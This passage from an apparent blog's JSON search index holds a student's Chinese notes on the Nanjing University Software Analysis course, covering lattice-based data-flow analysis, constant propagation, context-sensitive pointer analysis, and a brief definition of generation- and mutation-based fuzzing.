中）如下图，就是创建了一个数组对象，存储和读取都是对这个对象进行的。 Static field 和 local varible 的分析方式一样，Array element 简化后和 instance field 相同，所以聚焦于第一种和第三种句子的分析。 直接影响到指针指向的语句 一般分为以下五种语句：\nNew: x = new T() Assign: x = y Store: x.f = y Load: y = x.f Call: r = x.k(a,\u0026hellip;) Static call C.get() Special call super.foo() Virtual call x.get () ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"视频： 南京大学《软件分析》课程 08（Pointer Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—1","title":"南大软件分析第八节笔记"},{"content":"视频： 南京大学《软件分析》课程 06（Data Flow Analysis - Foundations II 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 软件分析——数据流分析2_zcc今天好好学习了吗的博客-CSDN博客 (33条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析笔记 PPT： https://cs.nju.edu.cn/tiantan/software-analysis/DFA-FD.pdf\n将不动点定理应用于算法 第 5 节课向我们介绍了不动点定理：完全 lattice 且是单调的、有限的，那么存在不动点且从⊤开始迭代找得到最大不动点和从⊥开始迭代找得到最小不动点；现在的问题是：如何关联迭代算法和不动点理论（那么就能证明算法解存在、且最优） 依据不动点定理的条件，我们只需要证明 CFG 是个 complete lattice + 证明转移函数是单调的。\n因为每一个 $v_i$ 都是 complete\u0026amp;finite lattices 那么，他们的笛卡尔积得到的 product lattice 也是 complete\u0026amp;finite 的（lattice 的性质） 转移函数有两步：第一步对每个 node 应用转移函数，第二步是进行 join 或 meet 处理。 第一步的转移函数中就是 gen 和 kill 操作，而 gen 和 kill 操作是固定的，结果只能是 0 变成 1 或者 1 变成 1，显然单调。 这里我琢磨了好久，要注意的是这里的转移函数是每次迭代的转移函数，而不是 BBs 之间的转移函数。BBs 之间转移函数的时候是可能将上一个 BB 位向量中的 1 kill 为 0，此时比较的是上一个 BB 和当前 BB 的位向量；但是在迭代层面我们去比较的是当前 BB 在上一次迭代和这次迭代的位向量，因为 gen 和 kill 操作是固定的，结果只能是 0 变成 1 或者 1 变成 1，所以是单调的。 第二步需要分别证明 join 和 meet 是单调的 Meet 证明方法同上 至此，我们将不动点定理与我们的算法联系起来了，迭代算法是可以终止的（到达不动点），并且不动点是最小或者最大不动点 下面来解答第三个问题，算法什么时候达到不动点（复杂度问题）\n迭代算法的复杂度 Lattice 的高度（深度） Top 到 Bottom 最长的路径 那么可以说 lattice 的深度最长的情况就是 BB 中 node 的个数（变量的个数）\n最坏的迭代次数 最坏的情况就是每次迭代只会改变位向量中的一位，并且不动点在位向量全为 1 处，所以最坏的迭代次数就是 h * k 次（这里存疑）。\n关于最坏迭代次数那里，h * k 理解不了啊，我觉得最坏就是 h 吧。就拿老师的那个例子来说最坏应该是 3x3=9，但是迭代不应该是空到第一层然后第二层然后第三层一共 3 次吗，如果非要 9 次的话，空到第一层还又要回到空，然后空到第一层另外的两个，这是 3 次，然后第一层到第二层和第二层到第三层同理一共 9 次。感觉这个 9 次不对吧。 从 lattice 的角度来看 may 和 must 分析 (关于 may 和 must 分析可以看一下数据流分析 1）\nmay analysis：输出的信息可能是正确的（也有可能是错误的），所以是过近似的分析 must analysis：输出的信息一定是正确的，所以是欠近似分析 选择 may 或者 must 分析都是为了分析结果的安全性（注意是安全性而不是正确性） 我个人的理解就是：\nmay 分析就像是或操作，但凡只有 1 条路径是满足我分析要求的，may 分析就为真。 比如可达性分析的应用——查看哪个变量没有初始化，只要有一条路径没有初始化，那么我的输出就是真，此时输出的信息不完全正确，因为其他路径对变量初始化了，但是这样的分析结果是安全的，因为不能存在没有初始化的变量 Must 分析就像是与操作，必须所有路径都满足我分析的要求，才是真 比如 available 表达式的分析的应用——将表达式最后的执行结果保存方便后续的使用（不用每次都计算表达式），这就要求每一条路径都是 available，所以需要每一条路都为真，那么最后的结果才是真。 注意 may 和 must 分析需要针对具体案例具体分析，有的时候正确性和安全性其实是矛盾的。 首先，无论是 may 还是 must 分析，都是从不安全的状态逐渐迭代到安全的状态（不动点），而且相反的是从准确的状态到不准确的状态。\nMay 分析（以可达性分析举例） 就像这个图显示的一样，bottom 表示没有定义可达（意思就是变量在所有的路径都初始化了），显然这样的结果是不安全的，但是精度（正确性）是最高的，因为输出的结果是“每条路径都没有定义可达”。 而 top 表示所有的定义都有可能可达，这样的结果是安全的，但是精度最低，因为这句话就是个废话。比如你在分析变量是否都被初始化，输出的结果是变量可能被初始化也可能没有被初始化。（注意这里的安全和精度是针对你的分析结论，而不是分析的那个程序。） Bottom 和 top 都不是我们想要的结果，所以引入一个概念 truth 来划分 safe 和 unsafe - 这里说一下我对 truth 的理解，老师说 truth 表示的是程序对所有输入的动态输出的集合，那么可以理解为这个椭圆里面的 lattices 并不是全是真实的 lattices，只是一个 lattices 的取值空间，实际上对应到分析的程序而言，输出得到的 lattices 的集合在这个椭圆（取值空间）中的点，我们称之为 truth，以此为边界，划分了 safe 和 unsafe。 - 同时老师也提到了为什么我们分析一定是 safe 的呢，是因为我们在 cfg 中依据 BBs 中的指令设计的转移函数就是 safe 的。 Ok，现在我们知道了这个椭圆从下到上从不安全而准确逐渐变化为安全而准确，并且我们的分析得到的不动点也在安全区，那么对于众多的不动点，我们选择那个最准确的，也就是最靠近 bottom 的——最小不动点。而我们的迭代算法得到的恰好就是这个最小不动点。\nMust 分析（以available expressions分析为例） 分析同上，不再赘述 ## 从“最小步伐”的角度来简要证明最小/最大不动点 将迭代算法转换到 lattice 上，考虑到了 f : L → L ，这个函数本质上就是算法中的转换函数和 join/mmet 操作构成的。 - 转换函数实际上是固定的，只要 BB 确定，那么其 kill 和 gen 是固定的，所以在 lattice 上走的步数是确定的 - join/mmet：lattice 上就是求两个值的最小上界/最大下界，那么其走的步数也是最小的 =\u0026gt; 所以，函数在 lattice 上是走的最小步数，那么得到的不动点一定是离出发点最近的（从 bottom 出发就是最小不动点，从 top 出发就是最大不动点）\nMOP Meet-over-all-paths solution （是衡量精度的） MOP 就是将 entry 到某个 BB 的所有路径的转移函数合为一个整体函数 $F_P$，$MOP[S_i]=\\cup /\\cap F_p(OUT[Entry])$ MOP 是有如下几个特点 Not executable 就是有的路径实际上是不会被执行的，因为在分析的时候会有一些冗余的路径，所以就导致了 MOP 实际上不是很准确 同时因为要遍历所有的路径，所以它是没有边界的（unbounded），而且如果程序很大还会有路径爆炸的问题，所以它又是不可枚举的（not enumerable），所以它难以操作 综上，MOP 这个方法可能不准确，实际操作性不高，是理论上的一个衡量方式。\n将 MOP 和我们迭代算法进行比较来更好的理解 MOP 对于以上的这个例子 迭代算法： $IN[S_4​]=fS_3​​(fS_1​​(OUT[entry])\\cup fS_2​​(OUT[entry]))$ MOP: $IN[S_4​]=fS_3​​(fS_1​​(OUT[entry]))\\cup fS_3​​(fS_2​(OUT[entry]))$ 所以迭代算法和 MOP 的计算区别在于： 迭代算法是：$F(x\\cup y)$ MOP 是：$F(x)\\cup F(y)$ 我们可以来证明一下这两种方式哪种更精准： ![image.png](https://gitee.com/juhuahua/chart-bed/raw/master/20230202184735.png) 迭代算法的结果是 MOP 结果的上界，说明 MOP 更精准些，但是如果函数 F 满足分配律（distributive）那么两者就会相等，精准度是一样的。而我们迭代算法中的 bit-vector（位向量）或者是 gen/kill 问题（对于 join/meet 是进行集合的交或并操作）是满足分配律的。 接下来要讲一个不是 distributive 的算法 # Constant propagation 常量传播 定义：给定一个变量 x 在程序点 p，判断是否在 p 时，x 能确保有个常量 显然这是个 must 分析 对于产量传播的分析中，CFG 中每个 node 的 OUT 都是一个 pairs（x, v），x 表示变量，v 表示 node 之后 x 的值。 接下来我们看看对于这个分析，它的数据流框架（D，L，F）（方向，lattices，转移函数）是什么。 ## 方向 forwards ## Lattice 如果是 must 分析，那么就是从上到下迭代，UNDEF（undefined） 到 NAC（not a constant）是从不安全且高精度到安全低精度。UBDEF 表示变量都还没有定义，NAC 表示没有一个是常量。中间的数字表示变量值可以是任何一个实数。 在这个 lattice 上的 meet 操作也有些许的不同： ## 转移函数 $F:OUT[s]=gen \\cup (IN[s]-\\{(x, \\_ )\\})$ Gen 的规则如下： （val (x) 表示取变量 x 的值) 现在我们 D，L，F 都明确了，我们来看一看为啥说常量传播是不满足分配率的。 不满足分配率 如下例所示 Worklist Algorithm 实际分析中其实是不会用迭代算法的，worklist algorithm 是对迭代算法的优化。 优化点：迭代算法中只要有一个 node 的 out 发生变化，那么我们就会重新计算全部的 note 的 out，但是其实有很大一部分的 node 的 out 已经达到不动点，所以 worklist 算法的优化就是将 out 发生变化的 node 的后继 node 放入 worklist，算法每次只计算 worklist 数组中的 node 的 out。 总结 最后我们来梳理一遍第六节课的内容。\n首先我们想要知道我们的迭代算法是否可以达到不动点，并且达到的不动点是不是最优的，所以我们得看迭代算法是否满足不动点定理的条件 有限 单调 接下来我们讨论了迭代算法的复杂度，知道了最坏的迭代次数 然后我们从 lattice 的角度重新审视了 may 和 must 分析，这里的两个图非常直观明了。 接着我们用 MOP 来衡量了一下迭代算法的精度 指出了满足分配律的转移函数的算法的精度和 MOP 一样 同时也介绍了一种不满足分配律的分析 最后给出了迭代算法的优化。 ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AD%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"视频： 南京大学《软件分析》课程 06（Data Flow Analysis - Foundations II 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 软件分析——数据流分析2_zc","title":"南大软件分析第六节笔记"},{"content":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程8——指针分析-上下文敏感（课时11/12） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Pointer Analysis: Context Sensitivity (nju.edu.cn) 上下文不敏感带来的问题 对于上述这段代码，当我们不考虑上下文去处理第 5、6 行的 id 函数调用的时候，id 的参数和返回值会和两次调用的参数和返回值杂糅在一起，这样假如在进行常量传播的时候，变量 i 就会被分析为 NAC，这是不对的。所以要对函数调用添加上下文，这样去分析第 7 行的时候 get 指向的就只有对象 One 里面的 get 函数\nIntroduction btw 上下文不敏感的英文是 contex insensitivity，缩写是 C.I. 上下文敏感的英文是 contex sensitivity，缩写是 C.S.\n目前 oldest 和 best-know 的上下文敏感策略是 call-site sensitivity（call-string） 使用 call site 链来表示每个方法的上下文（非重点） cloning-based 上下文敏感（最直观的方法去实现上下文敏感）、 每个上下文就会对变量和方法进行一次克隆 上下文敏感的堆 OO 程序是典型的堆敏感，因为程序会频繁的修改堆，所以也要对堆抽象添加上下文\n老师在这里进行举例表示上下文敏感和堆的上下文敏感缺一不可\n不考虑堆的上下文敏感，只考虑分析的上下文敏感\n我们可以看到虽然分析的时候考虑了上下文敏感，但是当调用方法中存在 new 语句的时候 （堆操作），不考虑堆的 C.S.就会像左图一样 考虑堆的上下文敏感，不考虑分析的上下文敏感\n当分析的时候不考虑上下文敏感，只考虑对的上下文敏感，如左图所示，在变量 p 处就出现了错误，随后导致 o_8. f 指向 o 1 和 o 2，即使堆上下文敏感也没用。 Context Sensitive Pointer Analysis：Rules 就是在之前的规则上面增加了标记\n根据调用者的行数来区分不同上下文，只要区分了函数、变量、堆对象，就能够区分实例域、上下文敏感的指针（变量+对象域）。 C：上下文（暂时用调用点的行数表示），O：对象，F：对象中的域。 Call 规则有所改变 select (c, l, c\u0026rsquo;: oi, m)根据调用时的信息来给调用目标函数选择上下文（c 是调用者的上下文，l 是调用者的行号，c\u0026rsquo;: oi 是 x 对象的指向集合，m 是目标函数），ct 表示目标函数的上下文（后面会将如何 Select 如何选择上下文）。c 是可以累积的，一连串的调用，上下文将用一连串的行数来表示。 ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82pointer-analysis-context-sensitivity-i/","summary":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记","title":"南大软件分析第十一节——Pointer Analysis - Context Sensitivity I"},{"content":"视频：南京大学《软件分析》课程13（Static Analysis for Security）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程9——污点分析（课时13） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Static Analysis for Security (nju.edu.cn) 没什么新东西，懒得写笔记了。\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%89%E8%8A%82static-analysis-for-security/","summary":"视频：南京大学《软件分析》课程13（Static Analysis for Security）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【","title":"南大软件分析第十三节——Static Analysis for Security"},{"content":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程8——指针分析-上下文敏感（课时11/12） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Pointer Analysis: Context Sensitivity (nju.edu.cn) 本节讲上下文敏感的过程间指针分析的算法 Context Sensitive Pointer Analysis：Algorithms C.S.和 C.I.的算法本质上没有什么区别，基本上就是把对象、变量前加了上下文的标识 唯一的区别在于 ProcessCall 中添加了 select 方法来找到目标函数 m 的上下文标识。 select 方法的细节在后面详细讲。\nContext Sensitivity Variants 上下文的生成主要有三种策略：\ncall-site sensitivity object sensitivity type sensitivity call-site sensitivity call-site sensitivity 的策略如上图所示，就是在原来上下文链的基础上，把调用点处的上下文加上去。 下图是例子。但是这样的分析策略带来了一个问题，就是图中 15 行，bar 方法内又调用自己，那么这样分析就不会终止，就会生成一个无穷无尽的上下文链。并且在实际分析程序中，即使没有想图中这样的情况，但是因为程序本身就很复杂，生成的上下文链也会很长，这样就会影响分析性能。 所以，call-site sensitivity 设定了上下文链的长度最长为 k，因此它又被称为 k-CFA。 设置了长度限制可以\n确保指针分析算法的终止 避免在实际分析中生成过长的上下文链 具体的操作就是对于生成的上下文链，如果长度大于 k，那么就只保留最后 k 个上下文。（在实际分析中，k 通常小于等于 3，并且在函数的上下文通常取2，堆上下文通常取1 的时候效果比较好） 这里老师举了个例子，还是挺绕的，建议去看看视频\nobject sensitivity 基于对象的上下文敏感就是不适用行号作为上下文，而是用 receive object 作为上下文敏感链。 举例： 如上图所示，1-object 的 object sensitivity。这样的优势是什么呢，如下图所示： call-site 的 sensitivity 在 12 行处汇聚了 5 和 6 行调用点的数据流，出现了错误。但是用 2-call-site 的 call-site sensitivity 可以解决这个问题。 但其实 call-site 上下文敏感和 object 上下文敏感半斤八两，如下图所示 理论上他们两个没啥可比性，但是在实践中对于 OO 语言，object sensitivity 无论是精准度还是性能都优于 call-site sensitivity 最后老师还讲了一个类型上下文敏感，基于创建点所在的类型，是基于对象敏感粗粒度的抽象，精度较低。是对 object sensitivity 的抽象，精度要弱于 object。\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%8A%82pointer-analysis-context-sensitivity-ii/","summary":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记","title":"南大软件分析第十二节——Pointer Analysis - Context Sensitivity II"},{"content":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili PPT： https://cs.nju.edu.cn/tiantan/software-analysis/PTA-FD.pdf 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 【课程笔记】南大软件分析课程7——指针分析基础（课时9/10） - 简书 (jianshu.com) 书接上回\n指针分析如何处理函数调用 老师再次提及了 CHA 算法的缺陷，CHA 是基于声明类型，所以不精准，可能会引入冗余的调用边和指针关系。\n因为声明类型可能是父类，而实例化的实际是个子类，当变量调用子类方法的时候，CHA 分析的时候会将父类的所有子类都纳入变量的指向关系，这样就多了很多实际没有的调用边和指针关系 所以相对于 CHA，基于 pt (a)的指针分析要更加精准，以过程间指针分析和 CG 构造同时进行，动态的去传播和添加指向关系，这样构成的调用图就没有冗余边了。\n调用语句规则 概括来说就是四步走\ndispatch 来找到方法 k 是到底是哪个函数 传 receiver object（第四行）：把 x 指向的对象 oi（就是第一行的 pt (x)）传入 m 函数的 this 变量 传参数 （第二行和第五行）：把每个参数指向的对象 ou 传给函数 m 的参数，mpj 意思是 m 的第 j 个参数，同时建立 PFG 边 传返回值（第三行和第六行）：pt (mret)传给 pt (r)，同时建立 PFG 边 问题：为什么 PFG 中不添加 x-\u0026gt;mthis 边？此时的 x 指向的那些 oi 和 m 具有相同的对象，所以可以流向 mthis，但是 PFG 是动态构建的，之后 x 可能指向了和 m 不是同一类的对象，那么此时将这些对象流向 mthis 是不对的。\n过程间 PTA 算法 （标黄色的地方是和过程内分析不同的地方） 符号解释\nmentry：入口 main 函数 Sm：函数m中的语句 S：可达语句的集合（就是RM中的语句） RM：可达函数的集合 CG：调用图的边 步骤\n从入口函数开始，首先 addreachable m_entry AddReachable () 将函数或对象加入集合 RM 表示该函数或对象已可达 然后将 m 的语句并入集合 s 中，表示 m 中的语句都已可达 处理 sm 中的 NEW 语句：将指向关系\u0026lt;xi, {o_i}\u0026gt;加入 WL 等待处理集合 处理 sm 中的 assign 语句：向 PFG 中添加边 处理 WL 集合 取出一个待传播的指向关系\u0026lt;n, pts\u0026gt; 去除 pts 中的 pt (n)避免重复传播 将 $\\Delta$ 传播到 n 的指向集合中 如果 n 表示一个变量 x，并且存在 load 和 store 语句，就对 $\\Delta$ 中的每个 o_i 进行 addedge 如果 n 表示一个变量 x，则对 $\\Delta$ 中的每个 o_i 和 x 进行 ProcessCall 操作 ProcessCall 用于处理变量 x 对函数的调用操作（就是本节一开始说的 CALL 语句） 从 S 语句集合中变量 x 的调用语句 L（调用的函数用 k 表示） 用 dispatch 去求解函数 k 到底是调用的哪个对象的哪个函数，结果用 m 表示，然后把待传播的指向关系\u0026lt;m_this, {o_i}\u0026gt;加入 WL 如果语句 L 到 m 的边在调用图中没有，就在调用图中添加一条从 L 指向 m 的边，并且设置 m 为可达 对于 m 中的每个参数，都在 PFG 中添加一条实参指向形参的边 添加一条 m 返回值指向调用处返回值的边 ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E8%8A%82pointer-analysis-foundations-ii/","summary":"视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili PPT： https://cs.nju.edu.cn/tiantan/software-analysis/PTA-FD.pdf 笔记参考：(34条消息) 【课程笔记】南大软","title":"南大软件分析第十节——Pointer Analysis - Foundations II"},{"content":"基于生成和基于变异的模糊 从测试用例生成的角度来看，模糊测试技术可分为基于生成的模糊测试技术和基于变异的模糊测试技术。 其中，基于生成的模糊测试技术根据语法或有效语料库从头开始生成输入，就好像从基因到人体的一个成长过程。该技术不进行比特位调度或变异算法调度，而是侧重于从初始规则构造。 基于变异的模糊测试技术对现有的有效果的异常测试用例（称为种子）进行变异，以获得新的测试用例。例如，玉米的基因变异会产生不同形态一样。该技术需要给定一个种子集，执行种子调度、比特位调度和变异算法调度以获得新的测试用例。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/","summary":"基于生成和基于变异的模糊 从测试用例生成的角度来看，模糊测试技术可分为基于生成的模糊测试技术和基于变异的模糊测试技术。 其中，基于生成的模糊测试","title":""},{"content":"待写。。。。\n","permalink":"https://juhuax.github.io/about/","summary":"待写。。。。","title":"About"},{"content":"\rJUHUA\u0026#39;s Blog\r和你分享我在干嘛\r格式要求 名称：\n网址：\n图标：\n描述：\n","permalink":"https://juhuax.github.io/links/","summary":"JUHUA\u0026#39;s Blog 和你分享我在干嘛 格式要求 名称： 网址： 图标： 描述：","title":"友链"}]